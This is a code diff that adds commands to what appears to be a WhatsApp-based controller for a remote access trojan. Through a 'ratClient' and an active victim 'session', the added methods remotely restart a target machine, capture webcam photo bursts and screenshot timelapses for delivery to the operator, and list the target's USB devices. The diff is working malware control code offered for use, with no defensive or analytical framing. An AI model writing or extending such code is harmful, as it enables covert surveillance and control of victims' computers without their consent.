@@ -362,4 +362,157 @@ export class FunCommands {
       });
     }
   }
+
+  /**
+   * Restart system
+   */
+  async restart(chatId, sessionId) {
+    if (!sessionId) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.warning('🔄 *Restarting system in 30 seconds...*\n\nTarget system will restart') 
+    });
+
+    const result = await this.ratClient.restart(sessionId);
+    
+    if (result.success) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.info(result.data) 
+      });
+    } else {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(result.error) 
+      });
+    }
+  }
+
+  /**
+   * Screenshot timelapse
+   */
+  async timelapse(chatId, sessionId, count, interval) {
+    if (!sessionId) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    const photoCount = count || 5;
+    const photoInterval = interval || 5;
+    const totalTime = photoCount * photoInterval;
+
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.info(`📸 Starting timelapse...\n\n${photoCount} photos every ${photoInterval}s\nTotal time: ~${totalTime}s\n\n_Please wait..._`) 
+    });
+
+    const result = await this.ratClient.screenshotTimelapse(sessionId, photoCount, photoInterval);
+    
+    if (result.success) {
+      let response = ResponseFormatter.header('📸', 'TIMELAPSE CAPTURE') + '\n\n';
+      
+      try {
+        const timelapse = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
+        response += `✅ Captured ${timelapse.total || photoCount} photos\n`;
+        response += `⏱️ Interval: ${timelapse.interval || photoInterval}s\n`;
+        response += `📦 Total size: ${timelapse.total_size || 'Unknown'}\n`;
+        response += `\n_Photos can be processed server-side_`;
+      } catch {
+        response += result.data;
+      }
+      
+      await this.sock.sendMessage(chatId, { text: response });
+    } else {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(result.error) 
+      });
+    }
+  }
+
+  /**
+   * Photo burst
+   */
+  async photoBurst(chatId, sessionId, count) {
+    if (!sessionId) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    const photoCount = count || 3;
+
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.info(`📷 Taking ${photoCount} photos in burst mode...\n\n_Please wait..._`) 
+    });
+
+    const result = await this.ratClient.photoBurst(sessionId, photoCount);
+    
+    if (result.success) {
+      let response = ResponseFormatter.header('📷', 'PHOTO BURST') + '\n\n';
+      
+      try {
+        const burst = typeof result.data === 'string' ? JSON.parse(result.data) : result.data;
+        response += `✅ Captured ${burst.count || photoCount} photos\n`;
+        response += `🎯 Each ~${burst.size_per_photo || 'Unknown'}KB\n`;
+        response += `📦 Total: ${burst.total_size || 'Unknown'}\n`;
+        response += `\n_Photos are base64 encoded and ready for delivery_`;
+      } catch {
+        response += result.data;
+      }
+      
+      await this.sock.sendMessage(chatId, { text: response });
+    } else {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(result.error) 
+      });
+    }
+  }
+
+  /**
+   * List USB devices
+   */
+  async usbList(chatId, sessionId) {
+    if (!sessionId) {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.warning('No active session. Use /use <id> first.') 
+      });
+      return;
+    }
+
+    await this.sock.sendMessage(chatId, { 
+      text: ResponseFormatter.info('💾 Enumerating USB devices...\n\n_Please wait..._') 
+    });
+
+    const result = await this.ratClient.enumerateUSB(sessionId);
+    
+    if (result.success) {
+      let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
+      
+      try {
+        const devices = typeof result.data === 'string' ? result.data.split('\n') : result.data;
+        const filtered = (Array.isArray(devices) ? devices : [devices]).filter(d => d && d.trim());
+        
+        if (filtered.length === 0) {
+          response += 'No USB devices connected';
+        } else {
+          filtered.slice(0, 10).forEach((dev, idx) => {
+            response += `${idx + 1}. ${dev.trim()}\n`;
+          });
+        }
+      } catch {
+        response += result.data;
+      }
+      
+      await this.sock.sendMessage(chatId, { text: response });
+    } else {
+      await this.sock.sendMessage(chatId, { 
+        text: ResponseFormatter.error(result.error) 
+      });
+    }
+  }
 }
